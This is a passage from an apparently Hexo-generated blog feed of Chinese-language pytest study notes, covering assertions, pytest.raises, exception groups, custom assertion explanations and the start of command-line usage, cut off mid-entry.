class="hljs-string">&quot;mylibrary.fixtures&quot;</span><br></code></pre></td></tr></table></figure><p>这有效地注册了mylibrary。fixture作为一个插件，使其所有fixture和钩子可用于app&#x2F;tests中的测试。</p><p>请注意<br>有时用户会从其他项目导入fixture以供使用，但不建议这样做:将fixture导入到模块中会将它们注册到pytest中，就像该模块中定义的那样。</p><p>这有轻微的后果，比如在pytest——help中出现多次，但不建议这样做，因为这种行为可能会在未来的版本中改变&#x2F;停止工作。</p><p><img src="/../img/bing_2022_OHR.CelebratingSurfing.jpg" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
      <tag>pytest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】之pytest在测试中编写和报告断言(三)</title>
    <link href="/2024/01/22/663python%E4%B9%8Bpytest%E5%9C%A8%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%BC%96%E5%86%99%E5%92%8C%E6%8A%A5%E5%91%8A%E6%96%AD%E8%A8%80-%E4%B8%89/"/>
    <url>/2024/01/22/663python%E4%B9%8Bpytest%E5%9C%A8%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%BC%96%E5%86%99%E5%92%8C%E6%8A%A5%E5%91%8A%E6%96%AD%E8%A8%80-%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h1 id="三-如何在测试中编写和报告断言"><a href="#三-如何在测试中编写和报告断言" class="headerlink" title="三 如何在测试中编写和报告断言"></a>三 如何在测试中编写和报告断言</h1><h2 id="3-1-使用-assert-语句断言"><a href="#3-1-使用-assert-语句断言" class="headerlink" title="3.1 使用 assert 语句断言"></a>3.1 使用 <code>assert</code> 语句断言</h2><p>pytest 允许使用标准 Python 断言来验证 Python 测试中的期望和值。例如，可以编写以下内容：</p><blockquote><p>assert 是Python中的关键字，assert 后面跟的如果为Ture 就通过，为False</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_assert1.py</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">3</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_function</span>():<br>    <span class="hljs-keyword">assert</span> f() == <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>断言函数返回某个值。如果此断言失败，将看到函数调用的返回值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">$ pytest test_assert1.py<br>=========================== test session starts ============================<br>platform linux -- Python <span class="hljs-number">3.</span>x.y, pytest-<span class="hljs-number">8.</span>x.y, pluggy-<span class="hljs-number">1.</span>x.y<br>rootdir: /home/sweet/project<br>collected <span class="hljs-number">1</span> item<br><br>test_assert1.py F     <span class="hljs-comment"># F就是失败                                                [100%]</span><br><br>================================= FAILURES =================================<br>______________________________ test_function _______________________________<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_function</span>():<br>&gt;       <span class="hljs-keyword">assert</span> f() == <span class="hljs-number">4</span><br>E       <span class="hljs-keyword">assert</span> <span class="hljs-number">3</span> == <span class="hljs-number">4</span><br>E        +  where <span class="hljs-number">3</span> = f()<br><br>test_assert1.py:<span class="hljs-number">6</span>: AssertionError<br>========================= short test summary info ==========================<br>FAILED test_assert1.py::test_function - <span class="hljs-keyword">assert</span> <span class="hljs-number">3</span> == <span class="hljs-number">4</span><br>============================ <span class="hljs-number">1</span> failed <span class="hljs-keyword">in</span> <span class="hljs-number">0.12</span>s =============================<br></code></pre></td></tr></table></figure><p>Pytest支持显示最常见的子表达式的值，包括调用、属性、比较、二进制和一元操作符。</p><p>如果使用如下断言指定消息：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">assert</span> a % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>, <span class="hljs-string">&quot;value was odd, should be even&quot;</span><br></code></pre></td></tr></table></figure><p>它将会与回溯中的断言检查一起打印。</p><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_study</span>(<span class="hljs-params">self</span>):<br>    a = <span class="hljs-number">1</span>+<span class="hljs-number">1</span><br>    <span class="hljs-keyword">assert</span>  a == <span class="hljs-number">0</span>, <span class="hljs-string">&quot;如果断言失败，就会在AssertionError中打印这句话，如果成功就不会打印&quot;</span><br></code></pre></td></tr></table></figure><h2 id="3-2-关于预期异常的断言"><a href="#3-2-关于预期异常的断言" class="headerlink" title="3.2 关于预期异常的断言"></a>3.2 关于预期异常的断言</h2><p>为了编写关于引发的异常的断言，你可以使用 <a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.raises"><code>pytest.raises()</code></a>如下上下文管理器</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_zero_division</span>():<br>    <span class="hljs-keyword">with</span> pytest.raises(ZeroDivisionError): <span class="hljs-comment"># pytest.raises 断言解释器报错</span><br>        <span class="hljs-number">1</span> / <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>如果您需要访问实际的异常信息，您可以使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_recursion_depth</span>():<br>    <span class="hljs-keyword">with</span> pytest.raises(RuntimeError) <span class="hljs-keyword">as</span> excinfo:<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>():<br>            f()<br><br>        f()<br>    <span class="hljs-keyword">assert</span> <span class="hljs-string">&quot;maximum recursion&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(excinfo.value)<br>excinfo`是一个[`ExceptionInfo`](https://docs.pytest.org/en/<span class="hljs-number">8.0</span>.x/reference/reference.html<span class="hljs-comment">#pytest.ExceptionInfo)实例，它是实际引发的异常的包装器。主要感兴趣的属性 是`.type`和。`.value``.traceback</span><br></code></pre></td></tr></table></figure><p>请注意，<code>pytest.raises</code>将匹配异常类型或任何子类（如标准<code>except</code>语句）。如果您想检查代码块是否引发确切的异常类型，则需要明确检查：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_foo_not_implemented</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>():<br>        <span class="hljs-keyword">raise</span> NotImplementedError<br><br>    <span class="hljs-keyword">with</span> pytest.raises(RuntimeError) <span class="hljs-keyword">as</span> excinfo:<br>        foo()<br>    <span class="hljs-keyword">assert</span> excinfo.<span class="hljs-built_in">type</span> <span class="hljs-keyword">is</span> RuntimeError <span class="hljs-comment"># 这是官方文档的，是错的，因为NotImplementedError是RuntimeError的子类 所以不是is 而是换成issubclass</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">issubclass</span>(excinfo.<span class="hljs-built_in">type</span>, RuntimeError) <span class="hljs-comment"># 这里所执行的foo()抛出的错误是NotImplementedError 所以断言通过了</span><br>    <br><span class="hljs-comment"># 另写一个例子</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>/<span class="hljs-number">0</span> <span class="hljs-comment"># 运行foo()会抛出一个ZeroDivisionError 0为除数异常</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_arithmetic_error</span>():<br>    <span class="hljs-keyword">with</span> pytest.raises(Exception) <span class="hljs-keyword">as</span> excinfo: <span class="hljs-comment"># pytest.raises()可以传Exception，Exception是所有错误的基类，这里也可以传ArithmeticError </span><br>        foo()<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">issubclass</span>(excinfo.<span class="hljs-built_in">type</span>, ArithmeticError)<br></code></pre></td></tr></table></figure><p>即使函数引发 NotImplementedError，pytest.raises() 调用也会成功，因为 <code>NotImplementedError</code> 是 <code>RuntimeError</code> 的子类；但是下面的断言语句将捕获该问题。</p><h3 id="3-2-1-匹配异常消息"><a href="#3-2-1-匹配异常消息" class="headerlink" title="3.2.1 匹配异常消息"></a>3.2.1 匹配异常消息</h3><p>可以将 match 关键字参数传递给上下文管理器，以测试正则表达式是否与异常的字符串表示形式匹配（类似于 unittest 中的 TestCase.assertRaisesRegex 方法）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myfunc</span>():<br>    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Exception 123 raised&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_match</span>():<br>    <span class="hljs-keyword">with</span> pytest.raises(ValueError, <span class="hljs-keyword">match</span>=<span class="hljs-string">r&quot;.* 123 .*&quot;</span>):<br>        myfunc()<br></code></pre></td></tr></table></figure><p>笔记:</p><ul><li>match 参数与 <code>re.search() </code>函数匹配，因此在上面的示例中 <code>match=&#39;123&#39; </code>也可以工作</li><li>匹配参数还与 PEP-678 <code>__notes__ </code>匹配。</li></ul><h3 id="3-2-2-匹配例外组exception-groups"><a href="#3-2-2-匹配例外组exception-groups" class="headerlink" title="3.2.2 匹配例外组exception groups"></a>3.2.2 匹配例外组exception groups</h3><p>您还可以使用<code>excinfo.group_contains()</code>方法来测试作为 <code>ExceptionGroup</code> 的一部分返回的异常</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_exception_in_group</span>():<br>    <span class="hljs-keyword">with</span> pytest.raises(ExceptionGroup) <span class="hljs-keyword">as</span> excinfo:<br>        <span class="hljs-keyword">raise</span> ExceptionGroup(<br>            <span class="hljs-string">&quot;Group message&quot;</span>,<br>            [<br>                RuntimeError(<span class="hljs-string">&quot;Exception 123 raised&quot;</span>),<br>            ],<br>        )<br>    <span class="hljs-keyword">assert</span> excinfo.group_contains(RuntimeError, <span class="hljs-keyword">match</span>=<span class="hljs-string">r&quot;.* 123 .*&quot;</span>)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-keyword">not</span> excinfo.group_contains(TypeError)<br></code></pre></td></tr></table></figure><p>可选的 match 关键字参数的工作方式与 pytest.raises() 相同。</p><p>默认情况下，group_contains()将在嵌套的ExceptionGroup实例的任何级别上递归地搜索匹配的异常。如果您只想在特定级别匹配异常，则可以指定depth关键字参数;直接包含在top ExceptionGroup中的异常将匹配depth&#x3D;1。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_exception_in_group_at_given_depth</span>():<br>    <span class="hljs-keyword">with</span> pytest.raises(ExceptionGroup) <span class="hljs-keyword">as</span> excinfo:<br>        <span class="hljs-keyword">raise</span> ExceptionGroup(<br>            <span class="hljs-string">&quot;Group message&quot;</span>,<br>            [<br>                RuntimeError(),<br>                ExceptionGroup(<br>                    <span class="hljs-string">&quot;Nested group&quot;</span>,<br>                    [<br>                        TypeError(),<br>                    ],<br>                ),<br>            ],<br>        )<br>    <span class="hljs-keyword">assert</span> excinfo.group_contains(RuntimeError, depth=<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">assert</span> excinfo.group_contains(TypeError, depth=<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-keyword">not</span> excinfo.group_contains(RuntimeError, depth=<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-keyword">not</span> excinfo.group_contains(TypeError, depth=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="3-2-3-xfail-mark-和-pytest-raises"><a href="#3-2-3-xfail-mark-和-pytest-raises" class="headerlink" title="3.2.3 xfail mark 和 pytest.raises"></a>3.2.3 xfail mark 和 pytest.raises</h3><p>也可以为pytest.mark指定一个raise参数。Xfail它以一种更具体的方式检查测试是否失败，而不仅仅是引发任何异常:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>():<br>    <span class="hljs-keyword">raise</span> IndexError()<br><br><br><span class="hljs-meta">@pytest.mark.xfail(<span class="hljs-params">raises=IndexError</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_f</span>():<br>    f()<br><br>testcases/test_case.py x                                                 [<span class="hljs-number">100</span>%]<br><br>============================== <span class="hljs-number">1</span> xfailed <span class="hljs-keyword">in</span> <span class="hljs-number">0.01</span>s ==============================<br></code></pre></td></tr></table></figure><p>如果测试因引发<code>IndexError</code>或子类而失败，也会“xfail”。</p><ul><li>使用带有参数的pytest.mark.xfail <code>raises</code>更适合记录未修复的bug（其中可以描述“应该”发生什么）或者依赖项中的错误</li><li>大多数情况下，测试你自己故意引发的异常错误的代码的情况，更适合使用<code>pytest.raises()</code>可能会更好一点，</li></ul><h2 id="3-3-利用上下文相关的比较"><a href="#3-3-利用上下文相关的比较" class="headerlink" title="3.3 利用上下文相关的比较"></a>3.3 利用上下文相关的比较</h2><p>pytest 对在遇到比较时提供上下文相关信息有丰富的支持。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_assert2.py</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_set_comparison</span>():<br>    set1 = <span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;1308&quot;</span>)<br>    set2 = <span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;8035&quot;</span>)<br>    <span class="hljs-keyword">assert</span> set1 == set2<br><br></code></pre></td></tr></table></figure><p>运行后报错：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">================================= FAILURES =================================<br>___________________________ test_set_comparison ____________________________<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_set_comparison</span>():<br>        set1 = <span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;1308&quot;</span>)<br>        set2 = <span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;8035&quot;</span>)<br>&gt;       <span class="hljs-keyword">assert</span> set1 == set2<br>E       AssertionError: <span class="hljs-keyword">assert</span> &#123;<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>&#125; == &#123;<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>&#125;<br>E<br>E         Extra items <span class="hljs-keyword">in</span> the left <span class="hljs-built_in">set</span>:<br>E         <span class="hljs-string">&#x27;1&#x27;</span><br>E         Extra items <span class="hljs-keyword">in</span> the right <span class="hljs-built_in">set</span>:<br>E         <span class="hljs-string">&#x27;5&#x27;</span><br>E         Use -v to get more diff<br><br>test_assert2.py:<span class="hljs-number">4</span>: AssertionError<br>========================= short test summary info ==========================<br>FAILED test_assert2.py::test_set_comparison - AssertionError: <span class="hljs-keyword">assert</span> &#123;<span class="hljs-string">&#x27;0&#x27;</span>...<br>============================ <span class="hljs-number">1</span> failed <span class="hljs-keyword">in</span> <span class="hljs-number">0.12</span>s =============================<br></code></pre></td></tr></table></figure><p>针对一些场景进行了专门的比较：</p><ul><li>比较长字符串：显示上下文差异</li><li>比较长序列：第一个失败的索引</li><li>比较字典：不同的条目</li></ul><p>有关更多示例，请参阅报告演示 <a href="https://docs.pytest.org/en/8.0.x/example/reportingdemo.html#tbreportdemo">reporting demo</a> </p><h2 id="3-4-为失败的断言定义自己的解释"><a href="#3-4-为失败的断言定义自己的解释" class="headerlink" title="3.4 为失败的断言定义自己的解释"></a>3.4 为失败的断言定义自己的解释</h2><p>可以通过实现 pytest_assertrepr_compare 钩子来添加您自己的详细解释。—&gt;会在“如何编写钩子函数”里讲</p><p><strong>pytest_assertrepr_compare</strong>(<em>config</em>, <em>op</em>, <em>left</em>, <em>right</em>)</p><p><strong>pytest_assertrepr_compare</strong>(<em>config</em>, <em>op</em>, <em>left</em>, <em>right</em>)[<a href="https://docs.pytest.org/en/8.0.x/_modules/_pytest/hookspec.html#pytest_assertrepr_compare">source]</a></p><p>   Return explanation for comparisons in failing assert expressions.</p><p>   Return None for no custom explanation, otherwise return a list of strings. The strings will be joined by    newlines but any newlines <em>in</em> a string will be escaped. Note that all but the first line will be indented slightly, the intention is for the first line to be a summary.</p><ul><li><p>Parameters:</p><p><strong>config</strong> (<a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.Config"><em>Config</em></a>) – The pytest config object.<strong>op</strong> (<a href="https://docs.python.org/3/library/stdtypes.html#str"><em>str</em></a>) – The operator, e.g. <code>&quot;==&quot;</code>, <code>&quot;!=&quot;</code>, <code>&quot;not in&quot;</code>.<strong>left</strong> (<a href="https://docs.python.org/3/library/functions.html#object"><em>object</em></a>) – The left operand.<strong>right</strong> (<a href="https://docs.python.org/3/library/functions.html#object"><em>object</em></a>) – The right operand.</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">pytest_assertrepr_compare</span>(<span class="hljs-params">config, op, left, right</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Return explanation for comparisons in failing assert expressions.</span><br><span class="hljs-string">返回失败断言表达式中的比较的解释。</span><br><span class="hljs-string">    Return None for no custom explanation, otherwise return a list of strings. The strings will be joined by newlines but any newlines in a string will be escaped. Note that all but the first line will be indented slightly, the intention is for the first line to be a summary.</span><br><span class="hljs-string">如果没有自定义解释，则返回 None，否则返回字符串列表,字符串将通过换行符连接，但字符串中的任何换行符都将被转义,请注意，除了第一行之外的所有行都将稍微缩进，目的是让第一行成为摘要。</span><br><span class="hljs-string">Parameters:</span><br><span class="hljs-string">    config (Config) – The pytest config object. pytest 配置对象</span><br><span class="hljs-string">    op (str) – The operator, e.g. &quot;==&quot;, &quot;!=&quot;, &quot;not in&quot;.操作员，例如“==”、“!=”、“不在”</span><br><span class="hljs-string">    left (object) – The left operand. 左操作数。</span><br><span class="hljs-string">    right (object) – The right operand.右操作数。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <br></code></pre></td></tr></table></figure><p>作为示例，请考虑在 conftest.py 文件中添加以下挂钩，该文件为 Foo 对象提供替代解释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of conftest.py</span><br><span class="hljs-keyword">from</span> test_foocompare <span class="hljs-keyword">import</span> Foo<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pytest_assertrepr_compare</span>(<span class="hljs-params">op, left, right</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(left, Foo) <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(right, Foo) <span class="hljs-keyword">and</span> op == <span class="hljs-string">&quot;==&quot;</span>:<br>        <span class="hljs-keyword">return</span> [<br>            <span class="hljs-string">&quot;Comparing Foo instances:&quot;</span>,<br>            <span class="hljs-string">f&quot;   vals: <span class="hljs-subst">&#123;left.val&#125;</span> != <span class="hljs-subst">&#123;right.val&#125;</span>&quot;</span>,<br>        ]<br></code></pre></td></tr></table></figure><p>现在，编写这个测试模块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_foocompare.py</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, val</span>):<br>        self.val = val<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-keyword">return</span> self.val == other.val<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_compare</span>():<br>    f1 = Foo(<span class="hljs-number">1</span>)<br>    f2 = Foo(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">assert</span> f1 == f2<br></code></pre></td></tr></table></figure><p>可以运行测试模块并获取conftest文件中定义的自定义输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">$ pytest -q test_foocompare.py<br>F                                                                    [<span class="hljs-number">100</span>%]<br>================================= FAILURES =================================<br>_______________________________ test_compare _______________________________<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_compare</span>():<br>        f1 = Foo(<span class="hljs-number">1</span>)<br>        f2 = Foo(<span class="hljs-number">2</span>)<br>&gt;       <span class="hljs-keyword">assert</span> f1 == f2<br>E       <span class="hljs-keyword">assert</span> Comparing Foo instances:<br>E            vals: <span class="hljs-number">1</span> != <span class="hljs-number">2</span><br><br>test_foocompare.py:<span class="hljs-number">12</span>: AssertionError<br>========================= short test summary info ==========================<br>FAILED test_foocompare.py::test_compare - <span class="hljs-keyword">assert</span> Comparing Foo instances:<br><span class="hljs-number">1</span> failed <span class="hljs-keyword">in</span> <span class="hljs-number">0.12</span>s<br></code></pre></td></tr></table></figure><h2 id="3-5-Assertion-introspection-details"><a href="#3-5-Assertion-introspection-details" class="headerlink" title="3.5 Assertion introspection details"></a>3.5 Assertion introspection details</h2><p>不做多介绍了，没啥用</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
      <tag>pytest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】之pytest命令行调用（二）</title>
    <link href="/2024/01/21/662python%E4%B9%8Bpytest%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%B0%83%E7%94%A8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2024/01/21/662python%E4%B9%8Bpytest%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%B0%83%E7%94%A8%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="二-如何用命令行调用pytest"><a href="#二-如何用命令行调用pytest" class="headerlink" title="二 如何用命令行调用pytest"></a>二 如何用命令行调用pytest</h1><p>See also</p><p><a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#command-line-flags">Complete pytest command-line flag reference</a></p><p>也可以点击链接查看完整的命令行介绍（那可太全面了）</p><blockquote><p>In general, pytest is invoked with the command pytest (see below for other ways to invoke pytest).  This will execute all tests in all files whose names follow the form test_*.py or *_test.py in the current directory and its subdirectories.  More generally, pytest follows standard test discovery rules.</p></blockquote><p>通常，pytest是用命令pytest调用的(参见下面的其他调用pytest的方法)。这将执行当前目录及其子目录中所有文件名以test_*.py或*_test.py形式结尾的文件中的所有测试。更一般地说，pytest遵循标准的<code>测试发现规则</code>。</p><h2 id="2-1-指定要运行的测试"><a href="#2-1-指定要运行的测试" class="headerlink" title="2.1 指定要运行的测试"></a>2.1 指定要运行的测试</h2><p>Pytest 支持多种从命令行运行和选择测试的方法。</p><p><strong>Run tests in a module：在模块中运行测试 （模块就是py文件）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pytest test_mod.py<br></code></pre></td></tr></table></figure><p><strong>Run tests in a directory：在目录中运行测试</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pytest testing/<br></code></pre></td></tr></table></figure><p><strong>Run tests by keyword expressions：通过关键字表达式运行测试</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pytest -k <span class="hljs-string">&#x27;MyClass and not method&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>This will run tests which contain names that match the given string expression (case-insensitive), which can include Python operators that use filenames, class names and function names as variables. The example above will run TestMyClass.test_something but not TestMyClass.test_method_simple. Use “” instead of ‘’ in expression when running this on Windows</p><p>这将运行包含与给定名称匹配的名称的测试 <em>字符串表达式</em> （不区分大小写），它可以包括使用文件名、类名和函数名作为变量的Python运算符。上面的例子将运行 <code>TestMyClass.test_something</code> 但不是 <code>TestMyClass.test_method_simple</code> .</p><p>（这个用的少）</p></blockquote><p><strong>Run tests by collection arguments：通过集合参数运行测试</strong></p><p>Pass the module filename relative to the working directory, followed by specifiers like the class name and function name separated by <code>::</code> characters, and parameters from parameterization enclosed in <code>[]</code>.</p><p>传递相对于工作目录的模块文件名，后跟由 :: 字符分隔的类名和函数名等说明符，以及包含在 [ ] 中的参数化参数。（下面让我们看看 :: 的用法）</p><p>To run a specific test within a module:要在模块内运行特定测试：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">pytest tests/test_mod.py::test_func<br></code></pre></td></tr></table></figure><p>To run all tests in a class: 要运行类中的所有测试：</p><figure class="highlight 